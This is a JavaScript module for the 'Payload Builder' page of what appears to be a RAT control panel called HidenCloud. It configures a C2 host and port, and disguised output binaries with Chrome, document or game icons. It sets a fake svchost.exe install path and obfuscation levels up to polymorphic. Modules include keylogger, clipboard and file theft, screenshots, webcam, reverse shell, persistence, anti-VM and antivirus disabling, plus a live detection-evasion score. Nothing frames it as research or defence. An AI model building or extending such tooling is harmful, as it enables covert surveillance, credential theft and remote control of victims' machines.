import { api } from "./api.js";
import { toast } from "./toast.js";
const state = {
    host: "c2.hidencloud.io",
    port: 4444,
    format: "exe",
    obfuscation: "medium",
    icon: "chrome",
    mutex: "HC-" + Math.random().toString(36).slice(2, 10).toUpperCase(),
    installPath: "%APPDATA%\\Microsoft\\svchost.exe",
    features: {
        keylogger: true,
        clipboard: true,
        screenshot: true,
        persistence: true,
        hideWindow: true,
        antiVM: false,
        disableAV: false,
        reverseShell: true,
        webcam: false,
        fileGrabber: true,
    },
};
const ICONS = {
    chrome: "🌐",
    document: "📄",
    installer: "⚙️",
    media: "🎵",
    game: "🎮",
    image: "🖼️",
};
export function renderBuilder() {
    return `
    <h1>Payload Builder</h1>
    <p class="page-sub">Configure and generate a HidenCloud client stub. Live-preview the size, target signature and features.</p>

    <div class="builder-layout">
      <div class="card builder-cfg">
        <div class="builder-section">
          <h3>🌐 Connection</h3>
          <label>C2 Host / Domain</label>
          <input id="b-host" value="${state.host}" placeholder="c2.example.com" />
          <label>Port</label>
          <input id="b-port" type="number" min="1" max="65535" value="${state.port}" />
        </div>

        <div class="builder-section">
          <h3>📦 Output</h3>
          <label>Format</label>
          <div class="chip-row" id="b-format">
            ${["exe", "msi", "apk", "elf", "dmg"].map((f) => `<button class="chip ${f === state.format ? "active" : ""}" data-val="${f}">${f.toUpperCase()}</button>`).join("")}
          </div>
          <label>Icon</label>
          <div class="icon-row" id="b-icon">
            ${Object.keys(ICONS).map((k) => `<button class="icon-tile ${k === state.icon ? "active" : ""}" data-val="${k}"><span>${ICONS[k]}</span><em>${k}</em></button>`).join("")}
          </div>
        </div>

        <div class="builder-section">
          <h3>🛡️ Evasion</h3>
          <label>Obfuscation</label>
          <div class="chip-row" id="b-obf">
            ${["none", "light", "medium", "heavy", "polymorphic"].map((o) => `<button class="chip ${o === state.obfuscation ? "active" : ""}" data-val="${o}">${o}</button>`).join("")}
          </div>
          <label>Mutex</label>
          <input id="b-mutex" value="${state.mutex}" />
          <label>Install Path</label>
          <input id="b-install" value="${state.installPath}" />
        </div>

        <div class="builder-section">
          <h3>✨ Features</h3>
          <div class="feature-grid" id="b-features">
            ${Object.keys(state.features).map((k) => `
              <label class="feature-toggle">
                <input type="checkbox" data-feat="${k}" ${state.features[k] ? "checked" : ""} />
                <span class="feature-name">${featureLabel(k)}</span>
              </label>`).join("")}
          </div>
        </div>
      </div>

      <div class="card builder-preview">
        <div class="preview-header">
          <div class="preview-icon" id="preview-icon">${ICONS[state.icon]}</div>
          <div>
            <div class="preview-title" id="preview-title">hidencloud-stub.${state.format}</div>
            <div class="muted" id="preview-target">${state.host}:${state.port}</div>
          </div>
        </div>

        <div class="preview-stats">
          <div><span class="muted">Est. size</span><strong id="preview-size">—</strong></div>
          <div><span class="muted">Detection</span><strong id="preview-detection">—</strong></div>
          <div><span class="muted">Startup</span><strong id="preview-startup">—</strong></div>
        </div>

        <h4 class="preview-h">Enabled modules</h4>
        <div class="preview-features" id="preview-features"></div>

        <div class="build-log" id="build-log">
          <div class="muted">Ready. Press Build to generate the payload.</div>
        </div>

        <button class="primary build-btn" id="b-build">🔨 Build Payload</button>
      </div>
    </div>
  `;
}
function featureLabel(k) {
    return k.replace(/([A-Z])/g, " $1").replace(/^./, (s) => s.toUpperCase());
}
function estimateSize() {
    const base = 128;
    const featCost = Object.values(state.features).filter(Boolean).length * 22;
    const obf = { none: 0, light: 40, medium: 90, heavy: 160, polymorphic: 260 }[state.obfuscation] ?? 0;
    return base + featCost + obf;
}
function detectionScore() {
    const heavy = state.obfuscation === "heavy" || state.obfuscation === "polymorphic";
    const av = state.features.disableAV;
    const anti = state.features.antiVM;
    let pct = 62;
    if (heavy)
        pct -= 25;
    if (av)
        pct -= 15;
    if (anti)
        pct -= 8;
    pct = Math.max(3, Math.min(pct, 95));
    const tone = pct < 20 ? "ok" : pct < 55 ? "idle" : "warn";
    return { pct, label: `${pct}/72 vendors`, tone };
}
export function bindBuilder(root) {
    const $ = (sel) => root.querySelector(sel);
    function update() {
        $("#preview-icon").textContent = ICONS[state.icon] ?? "📦";
        $("#preview-title").textContent = `hidencloud-stub.${state.format}`;
        $("#preview-target").textContent = `${state.host}:${state.port}`;
        $("#preview-size").textContent = `${estimateSize()} KB`;
        const det = detectionScore();
        const detEl = $("#preview-detection");
        detEl.textContent = det.label;
        detEl.className = `delta ${det.tone}`;
        $("#preview-startup").textContent = state.features.persistence ? "Auto-start" : "Manual";
        $("#preview-features").innerHTML = Object.entries(state.features)
            .filter(([, v]) => v)
            .map(([k]) => `<span class="feat-chip">✓ ${featureLabel(k)}</span>`)
            .join("") || `<span class="muted">No modules enabled</span>`;
    }
    root.querySelectorAll("#b-format .chip").forEach((c) => c.addEventListener("click", () => {
        state.format = c.dataset["val"];
        root.querySelectorAll("#b-format .chip").forEach((x) => x.classList.remove("active"));
        c.classList.add("active");
        update();
    }));
    root.querySelectorAll("#b-obf .chip").forEach((c) => c.addEventListener("click", () => {
        state.obfuscation = c.dataset["val"];
        root.querySelectorAll("#b-obf .chip").forEach((x) => x.classList.remove("active"));
        c.classList.add("active");
        update();
    }));
    root.querySelectorAll("#b-icon .icon-tile").forEach((c) => c.addEventListener("click", () => {
        state.icon = c.dataset["val"];
        root.querySelectorAll("#b-icon .icon-tile").forEach((x) => x.classList.remove("active"));
        c.classList.add("active");
        update();
    }));
    root.querySelectorAll("#b-features input").forEach((cb) => cb.addEventListener("change", () => {
        state.features[cb.dataset["feat"]] = cb.checked;
        update();
    }));
    $("#b-host").addEventListener("input", (e) => { state.host = e.target.value; update(); });
    $("#b-port").addEventListener("input", (e) => { state.port = Number(e.target.value) || 0; update(); });
    $("#b-mutex").addEventListener("input", (e) => { state.mutex = e.target.value; });
    $("#b-install").addEventListener("input", (e) => { state.installPath = e.target.value; });
    const log = $("#build-log");
    const buildBtn = $("#b-build");
    buildBtn.addEventListener("click", async () => {
        buildBtn.disabled = true;
        buildBtn.textContent = "Building…";
        log.innerHTML = "";
        const steps = [
            "Resolving dependencies…",
            "Compiling core runtime…",
            `Injecting ${Object.values(state.features).filter(Boolean).length} feature modules…`,
            `Applying ${state.obfuscation} obfuscation…`,
            "Signing binary…",
            "Packing…",
        ];
        for (const s of steps) {
            await new Promise((r) => setTimeout(r, 320));
            const line = document.createElement("div");
            line.className = "build-line";
            line.textContent = "▸ " + s;
            log.appendChild(line);
            log.scrollTop = log.scrollHeight;
        }
        try {
            const res = await api.build(state);
            const done = document.createElement("div");
            done.className = "build-line ok";
            done.textContent = `✓ Built ${res.filename} (${res.size} bytes)`;
            log.appendChild(done);
            const blob = new Blob([res.contents], { type: "application/octet-stream" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = res.filename;
            a.textContent = `⬇️ Download ${res.filename}`;
            a.className = "download-link";
            log.appendChild(a);
            toast("Payload built successfully", "success");
        }
        catch (err) {
            const line = document.createElement("div");
            line.className = "build-line err";
            line.textContent = "✗ " + (err instanceof Error ? err.message : "Build failed");
            log.appendChild(line);
            toast("Build failed", "warn");
        }
        finally {
            buildBtn.disabled = false;
            buildBtn.textContent = "🔨 Build Payload";
        }
    });
    update();
}
